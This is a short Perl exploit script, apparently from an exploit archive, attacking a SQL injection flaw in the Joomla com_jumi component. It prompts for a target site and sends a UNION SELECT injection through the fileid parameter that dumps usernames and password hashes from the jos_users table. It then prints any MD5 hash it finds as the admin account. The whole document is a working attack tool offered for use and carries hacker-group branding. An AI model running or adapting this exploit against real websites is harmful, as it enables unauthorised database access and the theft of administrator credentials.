#!/usr/bin/perl -w
 
########################################
#[~] Author : Muwafaq Lee
#[!] exploit Name: Joomla com_jumi
########################################
print "tt \n\n";
print "tt GH Injector | Ghana Attacker \n\n";
print "tt \n\n";
print "tt Joomla com_jumi Remote SQL Injection Exploit \n\n";
use LWP::UserAgent;
print " Target page:[http://wwww.site.com/path/]: ";
chomp(my $target=<STDIN>);
$dzmind="concat(username,0x3a,password)";
$sakkure="jos_users";
$com="com_jumi";
$cw="+UNION+SELECT+";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/index.php?option=".$com."&fileid=93&Itemid=117".$cw."1,".$dzmind.",3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from/**/".$sakkure."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Account : $1\n\n";
print "# Successfully Injected #\n\n";
}
else{print "\n[-] Exploit Failed :( \n";
}